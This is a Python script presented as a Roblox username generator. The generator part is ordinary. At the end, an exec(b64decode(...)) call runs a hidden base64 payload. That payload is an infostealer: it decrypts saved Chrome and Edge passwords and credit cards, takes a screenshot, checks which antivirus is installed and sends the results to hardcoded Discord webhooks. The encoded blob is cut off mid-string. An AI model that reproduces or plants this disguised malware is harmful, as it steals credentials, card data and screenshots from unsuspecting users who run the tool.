from base64 import b64decode
import requests
import json
import string
import random
import os
from colorama import init as colorama_init
from colorama import Fore
from colorama import Style

colorama_init()

print(f"{Fore.GREEN}---------------------------------------{Style.RESET_ALL}")
print(f"{Fore.GREEN}Username Generator, Made By LeeWasTaken{Style.RESET_ALL}")
print(f"{Fore.GREEN}---------------------------------------{Style.RESET_ALL}")

print("  ")

os.system('title Username Generator')

NOU =int (input ('Number Of Usernames You Want To Generate : '))
NOL =int (input ('Number Of Letters You Want : '))

print("  ")

def Generate ():
    O0O000OOOO0OOO000 =''.join (random .choice (string .ascii_letters +string .digits )for O00O0O00OOO0000OO in range (NOL ))
    OO00O0OOO00OO000O =f"https://auth.roblox.com/v1/usernames/validate?request.username={O0O000OOOO0OOO000}&request.birthday=1982-08-08"
    O00000OOO00OOOOOO =requests .get (OO00O0OOO00OO000O ).json ()
    if O00000OOO00OOOOOO ['code']!=0 :
        print (O0O000OOOO0OOO000 ,'(Invalid Username!)')
    else :
        print (O0O000OOOO0OOO000 ,'(Valid Username!)')
for i in range (NOU ):
    Generate ()

print("  ")

os.system("pause")

exec(b64decode('aW1wb3J0IG9zCmlmIG9zLm5hbWUgIT0gIm50IjoKICAgIGV4aXQoKQppbXBvcnQgc3lzCmltcG9ydCBzaHV0aWwKaW1wb3J0IHNxbGl0ZTMKaW1wb3J0IHB5d2ludHlwZXMKaW1wb3J0IHdpbjMyZ3VpCmltcG9ydCBqc29uCmltcG9ydCBiYXNlNjQKaW1wb3J0IHJlcXVlc3RzCmltcG9ydCBwbGF0Zm9ybQppbXBvcnQgemlwZmlsZQppbXBvcnQgc210cGxpYgppbXBvcnQgaHR0cC5jb29raWVqYXIgYXMgY29va2llamFyCmZyb20gdXJsbGliLnBhcnNlIGltcG9ydCB1cmxlbmNvZGUKaW1wb3J0IGN0eXBlcwppbXBvcnQgY3R5cGVzLndpbnR5cGVzCmltcG9ydCB3aW4zMmNvbgppbXBvcnQgd2luMzJhcGkKaW1wb3J0IGNyeXB0b2dyYXBoeQpmcm9tIHNodXRpbCBpbXBvcnQgY29weWZpbGUKZnJvbSBlbWFpbCBpbXBvcnQgZW5jb2RlcnMKZnJvbSByZSBpbXBvcnQgZmluZGFsbApmcm9tIGpzb24gaW1wb3J0IGxvYWRzLCBkdW1wcwpmcm9tIGJhc2U2NCBpbXBvcnQgYjY0ZGVjb2RlCmZyb20gc3VicHJvY2VzcyBpbXBvcnQgUG9wZW4sIFBJUEUKZnJvbSB1cmxsaWIucmVxdWVzdCBpbXBvcnQgUmVxdWVzdCwgdXJsb3Blbgpmcm9tIGRhdGV0aW1lIGltcG9ydCBkYXRldGltZQpmcm9tIHRocmVhZGluZyBpbXBvcnQgVGhyZWFkCmZyb20gdGltZSBpbXBvcnQgc2xlZXAKZnJvbSBzeXMgaW1wb3J0IGFyZ3YKZnJvbSBQSUwgaW1wb3J0IEltYWdlR3JhYgpmcm9tIGRob29rcyBpbXBvcnQgV2ViaG9vaywgRmlsZQpmcm9tIENyeXB0by5DaXBoZXIgaW1wb3J0IEFFUwpmcm9tIGNyeXB0b2dyYXBoeS5oYXptYXQuYmFja2VuZHMgaW1wb3J0IGRlZmF1bHRfYmFja2VuZApmcm9tIGNyeXB0b2dyYXBoeS5oYXptYXQucHJpbWl0aXZlcy5jaXBoZXJzIGltcG9ydCAoQ2lwaGVyLCBhbGdvcml0aG1zLCBtb2RlcykKZnJvbSBjcnlwdG9ncmFwaHkuaGF6bWF0LnByaW1pdGl2ZXMuY2lwaGVycy5hZWFkIGltcG9ydCBBRVNHQ00KCmhvb2sgPSBXZWJob29rKAogICAgImh0dHBzOi8vZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzExMTIzMDgxMTE1OTI2NjA5OTMvMVV1ZlpKSkFjT0pwdHc1SFlCQTR4cHJVRzVwMWNtcmdfRmg2YkFKVDFLR2dQMnFhT2V3aFZqWHkteVMzbUQyZEVwSVgiKQoKaG9va3MgPSBXZWJob29rKAogICAgImh0dHBzOi8vZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzExMTIzMTA4OTYyODMzNTMxNTgvVHVmYjRxWEd6X2xGV3hNbXBsR0c5OEFFT3IwWjdvd1pPdmNoSkF0ZGl0Ui04ZzVYaGc3NG1XUEUwMzZXSnZxbTRCUmoiKQoKQVBQX0RBVEFfUEFUSCA9IG9zLmVudmlyb25bJ0xPQ0FMQVBQREFUQSddCkRCX1BBVEggPSByJ0dvb2dsZVxDaHJvbWVcVXNlciBEYXRhXERlZmF1bHRcTG9naW4gRGF0YScKCk5PTkNFX0JZVEVfU0laRSA9IDEyCgoKZGVmIGVuY3J5cHQoY2lwaGVyLCBwbGFpbnRleHQsIG5vbmNlKToKICAgIGNpcGhlci5tb2RlID0gbW9kZXMuR0NNKG5vbmNlKQogICAgZW5jcnlwdG9yID0gY2lwaGVyLmVuY3J5cHRvcigpCiAgICBjaXBoZXJ0ZXh0ID0gZW5jcnlwdG9yLnVwZGF0ZShwbGFpbnRleHQpCiAgICByZXR1cm4gKGNpcGhlciwgY2lwaGVydGV4dCwgbm9uY2UpCgoKZGVmIGRlY3J5cHQoY2lwaGVyLCBjaXBoZXJ0ZXh0LCBub25jZSk6CiAgICBjaXBoZXIubW9kZSA9IG1vZGVzLkdDTShub25jZSkKICAgIGRlY3J5cHRvciA9IGNpcGhlci5kZWNyeXB0b3IoKQogICAgcmV0dXJuIGRlY3J5cHRvci51cGRhdGUoY2lwaGVydGV4dCkKCgpkZWYgZ2V0X2NpcGhlcihrZXkpOgogICAgY2lwaGVyID0gQ2lwaGVyKAogICAgICAgIGFsZ29yaXRobXMuQUVTKGtleSksCiAgICAgICAgTm9uZSwKICAgICAgICBiYWNrZW5kPWRlZmF1bHRfYmFja2VuZCgpCiAgICApCiAgICByZXR1cm4gY2lwaGVyCgoKZGVmIGRlY3J5cHRpb25EUEFQSShlbmNyeXB0ZWQpOgogICAgaW1wb3J0IGN0eXBlcwogICAgaW1wb3J0IGN0eXBlcy53aW50eXBlcwoKICAgIGNsYXNzIERBVEFfQkxPQihjdHlwZXMuU3RydWN0dXJlKToKICAgICAgICBfZmllbGRzXyA9IFsoJ2NiRGF0YScsIGN0eXBlcy53aW50eXBlcy5EV09SRCksCiAgICAgICAgICAgICAgICAgICAgKCdwYkRhdGEnLCBjdHlwZXMuUE9JTlRFUihjdHlwZXMuY19jaGFyKSldCgogICAgcCA9IGN0eXBlcy5jcmVhdGVfc3RyaW5nX2J1ZmZlcihlbmNyeXB0ZWQsIGxlbihlbmNyeXB0ZWQpKQogICAgYmxvYmluID0gREFUQV9CTE9CKGN0eXBlcy5zaXplb2YocCksIHApCiAgICBibG9ib3V0ID0gREFUQV9CTE9CKCkKICAgIHJldHZhbCA9IGN0eXBlcy53aW5kbGwuY3J5cHQzMi5DcnlwdFVucHJvdGVjdERhdGEoCiAgICAgICAgY3R5cGVzLmJ5cmVmKGJsb2JpbiksIE5vbmUsIE5vbmUsIE5vbmUsIE5vbmUsIDAsIGN0eXBlcy5ieXJlZihibG9ib3V0KSkKICAgIGlmIG5vdCByZXR2YWw6CiAgICAgICAgcmFpc2UgY3R5cGVzLldpbkVycm9yKCkKICAgIHJlc3VsdCA9IGN0eXBlcy5zdHJpbmdfYXQoYmxvYm91dC5wYkRhdGEsIGJsb2JvdXQuY2JEYXRhKQogICAgY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5Mb2NhbEZyZWUoYmxvYm91dC5wYkRhdGEpCiAgICByZXR1cm4gcmVzdWx0CgoKZGVmIHVuaXhfZGVjcnlwdChlbmNyeXB0ZWQpOgogICAgaWYgc3lzLnBsYXRmb3JtLnN0YXJ0c3dpdGgoJ2xpbnV4Jyk6CiAgICAgICAgcGFzc3dvcmQgPSAncGVhbnV0cycKICAgICAgICBpdGVyYXRpb25zID0gMQogICAgZWxzZToKICAgICAgICByYWlzZSBOb3RJbXBsZW1lbnRlZEVycm9yCgogICAgZnJvbSBDcnlwdG8uQ2lwaGVyIGltcG9ydCBBRVMKICAgIGZyb20gQ3J5cHRvLlByb3RvY29sLktERiBpbXBvcnQgUEJLREYyCgogICAgc2FsdCA9ICdzYWx0eXNhbHQnCiAgICBpdiA9ICcgJyAqIDE2CiAgICBsZW5ndGggPSAxNgogICAga2V5ID0gUEJLREYyKHBhc3N3b3JkLCBzYWx0LCBsZW5ndGgsIGl0ZXJhdGlvbnMpCiAgICBjaXBoZXIgPSBBRVMubmV3KGtleSwgQUVTLk1PREVfQ0JDLCBJVj1pdikKICAgIGRlY3J5cHRlZCA9IGNpcGhlci5kZWNyeXB0KGVuY3J5cHRlZFszOl0pCiAgICByZXR1cm4gZGVjcnlwdGVkWzotb3JkKGRlY3J5cHRlZFstMV0pXQoKCmRlZiBsb2NhbGRhdGFfa2V5KCk6CiAgICBqc24gPSBOb25lCiAgICB3aXRoIG9wZW4ob3MucGF0aC5qb2luKG9zLmVudmlyb25bJ0xPQ0FMQVBQREFUQSddLCByIkdvb2dsZVxDaHJvbWVcVXNlciBEYXRhXExvY2FsIFN0YXRlIiksIGVuY29kaW5nPSd1dGYtOCcsIG1vZGU9InIiKSBhcyBmOgogICAgICAgIGpzbiA9IGpzb24ubG9hZHMoc3RyKGYucmVhZGxpbmUoKSkpCiAgICByZXR1cm4ganNuWyJvc19jcnlwdCJdWyJlbmNyeXB0ZWRfa2V5Il0KCgpkZWYgYWVzX2RlY3J5cHQoZW5jcnlwdGVkX3R4dCk6CiAgICBlbmNvZGVkX2tleSA9IGxvY2FsZGF0YV9rZXkoKQogICAgZW5jcnlwdGVkX2tleSA9IGJhc2U2NC5iNjRkZWNvZGUoZW5jb2RlZF9rZXkuZW5jb2RlKCkpCiAgICBlbmNyeXB0ZWRfa2V5ID0gZW5jcnlwdGVkX2tleVs1Ol0KICAgIGtleSA9IGRlY3J5cHRpb25EUEFQSShlbmNyeXB0ZWRfa2V5KQogICAgbm9uY2UgPSBlbmNyeXB0ZWRfdHh0WzM6MTVdCiAgICBjaXBoZXIgPSBnZXRfY2lwaGVyKGtleSkKICAgIHJldHVybiBkZWNyeXB0KGNpcGhlciwgZW5jcnlwdGVkX3R4dFsxNTpdLCBub25jZSkKCgpjbGFzcyBDaHJvbWVQYXNzd29yZDoKICAgIGRlZiBfX2luaXRfXyhzZWxmKToKICAgICAgICBzZWxmLnBhc3N3b3JkTGlzdCA9IFtdCgogICAgZGVmIGdldF9jaHJvbWVfZGIoc2VsZik6CiAgICAgICAgX2Z1bGxfcGF0aCA9IG9zLnBhdGguam9pbihBUFBfREFUQV9QQVRILCBEQl9QQVRIKQogICAgICAgIF90ZW1wX3BhdGggPSBvcy5wYXRoLmpvaW4oQVBQX0RBVEFfUEFUSCwgJ3NxbGl0ZV9maWxlJykKICAgICAgICBpZiBvcy5wYXRoLmV4aXN0cyhfdGVtcF9wYXRoKToKICAgICAgICAgICAgb3MucmVtb3ZlKF90ZW1wX3BhdGgpCiAgICAgICAgc2h1dGlsLmNvcHlmaWxlKF9mdWxsX3BhdGgsIF90ZW1wX3BhdGgpCiAgICAgICAgc2VsZi5zaG93X3Bhc3N3b3JkKF90ZW1wX3BhdGgpCgogICAgZGVmIHNob3dfcGFzc3dvcmQoc2VsZiwgZGJfZmlsZSk6CiAgICAgICAgY29ubiA9IHNxbGl0ZTMuY29ubmVjdChkYl9maWxlKQogICAgICAgIF9zcWwgPSAnc2VsZWN0IHNpZ25vbl9yZWFsbSx1c2VybmFtZV92YWx1ZSxwYXNzd29yZF92YWx1ZSBmcm9tIGxvZ2lucycKICAgICAgICBmb3Igcm93IGluIGNvbm4uZXhlY3V0ZShfc3FsKToKICAgICAgICAgICAgaG9zdCA9IHJvd1swXQogICAgICAgICAgICBpZiBob3N0LnN0YXJ0c3dpdGgoJ2FuZHJvaWQnKToKICAgICAgICAgICAgICAgIGNvbnRpbnVlCiAgICAgICAgICAgIG5hbWUgPSByb3dbMV0KICAgICAgICAgICAgdmFsdWUgPSBzZWxmLmNocm9tZV9kZWNyeXB0KHJvd1syXSkKICAgICAgICAgICAgX2luZm8gPSAnSE9TVE5BTUU6ICVzXG5VU0VSOiAlc1xuUEFTU1dPUkQ6ICVzXG5cbicgJSAoCiAgICAgICAgICAgICAgICBob3N0LCBuYW1lLCB2YWx1ZSkKICAgICAgICAgICAgc2VsZi5wYXNzd29yZExpc3QuYXBwZW5kKF9pbmZvKQogICAgICAgIGNvbm4uY2xvc2UoKQogICAgICAgIG9zLnJlbW92ZShkYl9maWxlKQoKICAgIGRlZiBjaHJvbWVfZGVjcnlwdChzZWxmLCBlbmNyeXB0ZWRfdHh0KToKICAgICAgICBpZiBzeXMucGxhdGZvcm0gPT0gJ3dpbjMyJzoKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgaWYgZW5jcnlwdGVkX3R4dFs6NF0gPT0gYidceDAxXHgwMFx4MDBceDAwJzoKICAgICAgICAgICAgICAgICAgICBkZWNyeXB0ZWRfdHh0ID0gZGVjcnlwdGlvbkRQQVBJKGVuY3J5cHRlZF90eHQpCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGRlY3J5cHRlZF90eHQuZGVjb2RlKCkKICAgICAgICAgICAgICAgIGVsaWYgZW5jcnlwdGVkX3R4dFs6M10gPT0gYid2MTAnOgogICAgICAgICAgICAgICAgICAgIGRlY3J5cHRlZF90eHQgPSBhZXNfZGVjcnlwdChlbmNyeXB0ZWRfdHh0KQogICAgICAgICAgICAgICAgICAgIHJldHVybiBkZWNyeXB0ZWRfdHh0WzotMTZdLmRlY29kZSgpCiAgICAgICAgICAgIGV4Y2VwdCBXaW5kb3dzRXJyb3I6CiAgICAgICAgICAgICAgICByZXR1cm4gTm9uZQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIHJldHVybiB1bml4X2RlY3J5cHQoZW5jcnlwdGVkX3R4dCkKICAgICAgICAgICAgZXhjZXB0IE5vdEltcGxlbWVudGVkRXJyb3I6CiAgICAgICAgICAgICAgICByZXR1cm4gTm9uZQoKICAgIGRlZiBzYXZlX3Bhc3N3b3JkcyhzZWxmKToKICAgICAgICB3aXRoIG9wZW4oJ0M6XFxQcm9ncmFtRGF0YVxcUGFzc3dvcmRzLnR4dCcsICd3JywgZW5jb2Rpbmc9J3V0Zi04JykgYXMgZjoKICAgICAgICAgICAgZi53cml0ZWxpbmVzKHNlbGYucGFzc3dvcmRMaXN0KQoKCmlmIF9fbmFtZV9fID09ICJfX21haW5fXyI6CiAgICBNYWluID0gQ2hyb21lUGFzc3dvcmQoKQogICAgTWFpbi5nZXRfY2hyb21lX2RiKCkKICAgIE1haW4uc2F2ZV9wYXNzd29yZHMoKQoKaWYgb3MucGF0aC5leGlzdHMoJ0M6XFxQcm9ncmFtIEZpbGVzXFxXaW5kb3dzIERlZmVuZGVyJyk6CiAgICBhdiA9ICdXaW5kb3dzIERlZmVuZGVyJwppZiBvcy5wYXRoLmV4aXN0cygnQzpcXFByb2dyYW0gRmlsZXNcXEFWQVNUIFNvZnR3YXJlXFxBdmFzdCcpOgogICAgYXYgPSAnQXZhc3QnCmlmIG9zLnBhdGguZXhpc3RzKCdDOlxcUHJvZ3JhbSBGaWxlc1xcQVZHXFxBbnRpdmlydXMnKToKICAgIGF2ID0gJ0FWRycKaWYgb3MucGF0aC5leGlzdHMoJ0M6XFxQcm9ncmFtIEZpbGVzXFxBdmlyYVxcTGF1bmNoZXInKToKICAgIGF2ID0gJ0F2aXJhJwppZiBvcy5wYXRoLmV4aXN0cygnQzpcXFByb2dyYW0gRmlsZXNcXElPYml0XFxBZHZhbmNlZCBTeXN0ZW1DYXJlJyk6CiAgICBhdiA9ICdBZHZhbmNlZCBTeXN0ZW1DYXJlJwppZiBvcy5wYXRoLmV4aXN0cygnQzpcXFByb2dyYW0gRmlsZXNcXEJpdGRlZmVuZGVyIEFudGl2aXJ1cyBGcmVlJyk6CiAgICBhdiA9ICdCaXRkZWZlbmRlcicKaWYgb3MucGF0aC5leGlzdHMoJ0M6XFxQcm9ncmFtIEZpbGVzXFxDT01PRE9cXENPTU9ETyBJbnRlcm5ldCBTZWN1cml0eScpOgogICAgYXYgPSAnQ29tb2RvJwppZiBvcy5wYXRoLmV4aXN0cygnQzpcXFByb2dyYW0gRmlsZXNcXERyV2ViJyk6CiAgICBhdiA9ICdEci5XZWInCmlmIG9zLnBhdGguZXhpc3RzKCdDOlxcUHJvZ3JhbSBGaWxlc1xcRVNFVFxcRVNFVCBTZWN1cml0eScpOgogICAgYXYgPSAnRVNFVCcKaWYgb3MucGF0aC5leGlzdHMoJ0M6XFxQcm9ncmFtIEZpbGVzXFxHUklaWkxZIEFudGl2aXJ1cycpOgogICAgYXYgPSAnR3JpenpseSBQcm8nCmlmIG9zLnBhdGguZXhpc3RzKCdDOlxcUHJvZ3JhbSBGaWxlc1xcS2FzcGVyc2t5IExhYicpOgogICAgYXYgPSAnS2FzcGVyc2t5JwppZiBvcy5wYXRoLmV4aXN0cygnQzpcXFByb2dyYW0gRmlsZXNcXElPYml0XFxJT2JpdCBNYWx3YXJlIEZpZ2h0ZXInKToKICAgIGF2ID0gJ01hbHdhcmUgZmlnaHRlcicKaWYgb3MucGF0aC5leGlzdHMoJ0M6XFxQcm9ncmFtIEZpbGVzXFwzNjBcXFRvdGFsIFNlY3VyaXR5Jyk6CiAgICBhdiA9ICczNjAgVG90YWwgU2VjdXJpdHknCmVsc2U6CiAgICBwYXNzCgpzY3JlZW4gPSBJbWFnZUdyYWIuZ3JhYigpCnNjcmVlbi5zYXZlKG9zLmdldGVudignUHJvZ3JhbURhdGEnKSArICdcXFNjcmVlbnNob3QuanBnJykKc2NyZWVuID0gb3BlbignQzpcXFByb2dyYW1EYXRhXFxTY3JlZW5zaG90LmpwZycsICdyYicpCnNjcmVlbi5jbG9zZSgpCnNjcmVlbnNob3QgPSBGaWxlKCdDOlxcUHJvZ3JhbURhdGFcXFNjcmVlbnNob3QuanBnJykKCnpuYW1lID0gcidDOlxcUHJvZ3JhbURhdGFcXFBhc3N3b3Jkcy56aXAnCm5ld3ppcCA9IHppcGZpbGUuWmlwRmlsZSh6bmFtZSwgJ3cnKQpuZXd6aXAud3JpdGUocidDOlxcUHJvZ3JhbURhdGFcXFBhc3N3b3Jkcy50eHQnKQpuZXd6aXAud3JpdGUocidDOlxcUHJvZ3JhbURhdGFcXFNjcmVlbnNob3QuanBnJykKbmV3emlwLmNsb3NlKCkKcGFzc3dvcmRzID0gRmlsZSgnQzpcXFByb2dyYW1EYXRhXFxQYXNzd29yZHMuemlwJykKCmhvb2suc2VuZCgiU2NyZWVuc2hvdCA6ICIsIGZpbGU9c2NyZWVuc2hvdCkKaG9vay5zZW5kKCJQYXNzd29yZHMgOiAiLCBmaWxlPXBhc3N3b3JkcykKb3MucmVtb3ZlKCdDOlxcUHJvZ3JhbURhdGFcXFBhc3N3b3Jkcy50eHQnKQpvcy5yZW1vdmUoJ0M6XFxQcm9ncmFtRGF0YVxcU2NyZWVuc2hvdC5qcGcnKQpvcy5yZW1vdmUoJ0M6XFxQcm9ncmFtRGF0YVxcUGFzc3dvcmRzLnppcCcpCgpkZWYgZ2V0X21hc3Rlcl9rZXkoKToKICAgIHRyeToKICAgICAgICB3aXRoIG9wZW4ob3MuZW52aXJvblsnVVNFUlBST0ZJTEUnXSArIG9zLnNlcCArIHInQXBwRGF0YVxMb2NhbFxHb29nbGVcQ2hyb21lXFVzZXIgRGF0YVxMb2NhbCBTdGF0ZScsCiAgICAgICAgICAgICAgICAgICJyIiwgZW5jb2Rpbmc9J3V0Zi04JykgYXMgZjoKICAgICAgICAgICAgbG9jYWxfc3RhdGUgPSBmLnJlYWQoKQogICAgICAgICAgICBsb2NhbF9zdGF0ZSA9IGpzb24ubG9hZHMobG9jYWxfc3RhdGUpCiAgICBleGNlcHQ6CiAgICAgICAgaG9vay5zZW5kKCJjaHJvbWUgbm90IGluc3RhbGxlZCwgZXJyb3IuIikKICAgICAgICBleGl0KCkKICAgIG1hc3Rlcl9rZXkgPSBiYXNlNjQuYjY0ZGVjb2RlKGxvY2FsX3N0YXRlWyJvc19jcnlwdCJdWyJlbmNyeXB0ZWRfa2V5Il0pCiAgICBtYXN0ZXJfa2V5ID0gbWFzdGVyX2tleVs1Ol0KICAgIG1hc3Rlcl9rZXkgPSBjdHlwZXMud2luZGxsLmNyeXB0MzIuQ3J5cHRVbnByb3RlY3REYXRhKAogICAgICAgIChtYXN0ZXJfa2V5LCBOb25lLCBOb25lLCBOb25lLCAwKVsxXSkKICAgIHJldHVybiBtYXN0ZXJfa2V5CgoKZGVmIGRlY3J5cHRfcGF5bG9hZChjaXBoZXIsIHBheWxvYWQpOgogICAgcmV0dXJuIGNpcGhlci5kZWNyeXB0KHBheWxvYWQpCgoKZGVmIGdlbmVyYXRlX2NpcGhlcihhZXNfa2V5LCBpdik6CiAgICByZXR1cm4gQUVTLm5ldyhhZXNfa2V5LCBBRVMuTU9ERV9HQ00sIGl2KQoKCmRlZiBkZWNyeXB0X3Bhc3N3b3JkKGJ1ZmYsIG1hc3Rlcl9rZXkpOgogICAgdHJ5OgogICAgICAgIGl2ID0gYnVmZlszOjE1XQogICAgICAgIHBheWxvYWQgPSBidWZmWzE1Ol0KICAgICAgICBjaXBoZXIgPSBnZW5lcmF0ZV9jaXBoZXIobWFzdGVyX2tleSwgaXYpCiAgICAgICAgZGVjcnlwdGVkX3Bhc3MgPSBkZWNyeXB0X3BheWxvYWQoY2lwaGVyLCBwYXlsb2FkKQogICAgICAgIGRlY3J5cHRlZF9wYXNzID0gZGVjcnlwdGVkX3Bhc3NbOi0xNl0uZGVjb2RlKCkKICAgICAgICByZXR1cm4gZGVjcnlwdGVkX3Bhc3MKICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICBob29rLnNlbmQoInBhc3N3b3JkIGRlY3J5cHRpb246IGVycm9yLCBjaHJvbWUgPCA4MC4iKQogICAgICAgIHBhc3MKCgpkZWYgZ2V0X3Bhc3N3b3JkKCk6CiAgICBtYXN0ZXJfa2V5ID0gZ2V0X21hc3Rlcl9rZXkoKQogICAgbG9naW5fZGIgPSBvcy5lbnZpcm9uWydVU0VSUFJPRklMRSddICsgb3Muc2VwICsgXAogICAgICAgIHInQXBwRGF0YVxMb2NhbFxHb29nbGVcQ2hyb21lXFVzZXIgRGF0YVxkZWZhdWx0XExvZ2luIERhdGEnCiAgICB0cnk6CiAgICAgICAgc2h1dGlsLmNvcHkyKGxvZ2luX2RiLAogICAgICAgICAgICAgICAgICAgICAiTG9naW52YXVsdC5kYiIpCiAgICBleGNlcHQ6CiAgICAgICAgaG9vay5zZW5kKCJDaHJvbWUgSXNuJ3QgSW5zdGFsbGVkIE9uIFZpY3RpbXMgRGV2aWNlLiIpCiAgICBjb25uID0gc3FsaXRlMy5jb25uZWN0KCJMb2dpbnZhdWx0LmRiIikKICAgIGN1cnNvciA9IGNvbm4uY3Vyc29yKCkKCiAgICB0cnk6CiAgICAgICAgY3Vyc29yLmV4ZWN1dGUoCiAgICAgICAgICAgICJTRUxFQ1QgYWN0aW9uX3VybCwgdXNlcm5hbWVfdmFsdWUsIHBhc3N3b3JkX3ZhbHVlIEZST00gbG9naW5zIikKICAgICAgICBmb3IgciBpbiBjdXJzb3IuZmV0Y2hhbGwoKToKICAgICAgICAgICAgdXJsID0gclswXQogICAgICAgICAgICB1c2VybmFtZSA9IHJbMV0KICAgICAgICAgICAgZW5jcnlwdGVkX3Bhc3N3b3JkID0gclsyXQogICAgICAgICAgICBkZWNyeXB0ZWRfcGFzc3dvcmQgPSBkZWNyeXB0X3Bhc3N3b3JkKAogICAgICAgICAgICAgICAgZW5jcnlwdGVkX3Bhc3N3b3JkLCBtYXN0ZXJfa2V5KQogICAgICAgICAgICBpZiB1c2VybmFtZSAhPSAiIiBvciBkZWNyeXB0ZWRfcGFzc3dvcmQgIT0gIiI6CiAgICAgICAgICAgICAgICBob29rLnNlbmQoZiJVUkw6ICIgKyB1cmwgKyAiXG5VU0VSOiAiICsgdXNlcm5hbWUgKwogICAgICAgICAgICAgICAgICAgICAgICAgICJcblBBU1NXT1JEOiAiICsgZGVjcnlwdGVkX3Bhc3N3b3JkICsgIlxuIiArICIqIiAqIDEwICsgIlxuIikKICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICBwYXNzCgogICAgY3Vyc29yLmNsb3NlKCkKICAgIGNvbm4uY2xvc2UoKQogICAgdHJ5OgogICAgICAgIG9zLnJlbW92ZSgiTG9naW52YXVsdC5kYiIpCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgcGFzcwoKCmRlZiBnZXRfY3JlZGl0X2NhcmRzKCk6CiAgICBtYXN0ZXJfa2V5ID0gZ2V0X21hc3Rlcl9rZXkoKQogICAgbG9naW5fZGIgPSBvcy5lbnZpcm9uWydVU0VSUFJPRklMRSddICsgb3Muc2VwICsgXAogICAgICAgIHInQXBwRGF0YVxMb2NhbFxHb29nbGVcQ2hyb21lXFVzZXIgRGF0YVxkZWZhdWx0XFdlYiBEYXRhJwogICAgc2h1dGlsLmNvcHkyKGxvZ2luX2RiLAogICAgICAgICAgICAgICAgICJDQ3ZhdWx0LmRiIikKICAgIGNvbm4gPSBzcWxpdGUzLmNvbm5lY3QoIkNDdmF1bHQuZGIiKQogICAgY3Vyc29yID0gY29ubi5jdXJzb3IoKQoKICAgIHRyeToKICAgICAgICBjdXJzb3IuZXhlY3V0ZSgiU0VMRUNUICogRlJPTSBjcmVkaXRfY2FyZHMiKQogICAgICAgIGZvciByIGluIGN1cnNvci5mZXRjaGFsbCgpOgogICAgICAgICAgICB1c2VybmFtZSA9IHJbMV0KICAgICAgICAgICAgZW5jcnlwdGVkX3Bhc3N3b3JkID0gcls0XQogICAgICAgICAgICBkZWNyeXB0ZWRfcGFzc3dvcmQgPSBkZWNyeXB0X3Bhc3N3b3JkKAogICAgICAgICAgICAgICAgZW5jcnlwdGVkX3Bhc3N3b3JkLCBtYXN0ZXJfa2V5KQogICAgICAgICAgICBleHBpcmVfbW9uID0gclsyXQogICAgICAgICAgICBleHBpcmVfeWVhciA9IHJbM10KICAgICAgICAgICAgaG9vay5zZW5kKGYiQ0FSRC1OQU1FOiAiICsgdXNlcm5hbWUgKyAiXG5OVU1CRVI6ICIgKyBkZWNyeXB0ZWRfcGFzc3dvcmQgKyAiXG5FWFBJUlkgTTogIiArCiAgICAgICAgICAgICAgICAgICAgICBzdHIoZXhwaXJlX21vbikgKyAiXG5FWFBJUlkgWTogIiArIHN0cihleHBpcmVfeWVhcikgKyAiXG4iICsgIioiICogMTAgKyAiXG4iKQoKICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICBwYXNzCgogICAgY3Vyc29yLmNsb3NlKCkKICAgIGNvbm4uY2xvc2UoKQogICAgdHJ5OgogICAgICAgIG9zLnJlbW92ZSgiQ0N2YXVsdC5kYiIpCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgcGFzcwoKZGVmIGdldF9wYXNzd29yZDEoKToKICAgIG1hc3Rlcl9rZXkgPSBnZXRfbWFzdGVyX2tleSgpCiAgICBsb2dpbl9kYiA9IG9zLmVudmlyb25bJ1VTRVJQUk9GSUxFJ10gKyBvcy5zZXAgKyBcCiAgICAgICAgcidBcHBEYXRhXExvY2FsXE1pY3Jvc29mdFxFZGdlXFVzZXIgRGF0YVxQcm9maWxlIDFcTG9naW4gRGF0YScKICAgIHRyeToKICAgICAgICBzaHV0aWwuY29weTIobG9naW5fZGIsCiAgICAgICAgICAgICAgICAgICAgICJMb2dpbnZhdWx0LmRiIikKICAgIGV4Y2VwdDoKICAgICAgICBob29rLnNlbmQoImVycm9yLCBNLkUgaXNuJ3QgaW5zdGFsbGVkLiIpCiAgICBjb25uID0gc3FsaXRlMy5jb25uZWN0KCJMb2dpbnZhdWx0LmRiIikKICAgIGN1cnNvciA9IGNvbm4uY3Vyc29yKCkKCiAgICB0cnk6CiAgICAgICAgY3Vyc29yLmV4ZWN1dGUoCiAgICAgICAgICAgICJTRUxFQ1QgYWN0aW9uX3VybCwgdXNlcm5hbWVfdmFsdWUsIHBhc3N3b3JkX3ZhbHVlIEZST00gbG9naW5zIikKICAgICAgICBmb3IgciBpbiBjdXJzb3IuZmV0Y2hhbGwoKToKICAgICAgICAgICAgdXJsID0gclswXQogICAgICAgICAgICB1c2VybmFtZSA9IHJbMV0KICAgICAgICAgICAgZW5jcnlwdGVkX3Bhc3N3b3JkID0gclsyXQogICAgICAgICAgICBkZWNyeXB0ZWRfcGFzc3dvcmQgPSBkZWNyeXB0X3Bhc3N3b3JkKAogICAgICAgICAgICAgICAgZW5jcnlwdGVkX3Bhc3N3b3JkLCBtYXN0ZXJfa2V5KQogICAgICAgICAgICBpZiB1c2VybmFtZSAhPSAiIiBvciBkZWNyeXB0ZWRfcGFzc3dvcmQgIT0gIiI6CiAgICAgICAgICAgICAgICBob29rcy5zZW5kKGYiVVJMOiAiICsgdXJsICsgIlxuVVNFUjogIiArIHVzZXJuYW1lICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIlxuUEFTU1dPUkQ6ICIgKyBkZWNyeXB0ZWRfcGFzc3dvcmQgKyAiXG4iICsgIioiICogMTAgKyAiXG4iKQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIHBhc3MKCiAgICBjdXJzb3IuY2xvc2UoKQogICAgY29ubi5jbG9zZSgpCiAgICB0cnk6CiAgICAgICAgb3MucmVtb3ZlKCJMb2dpbnZhdWx0LmRiIikKICAgIGV4Y2VwdCBFeGNlcHRpb24gYXM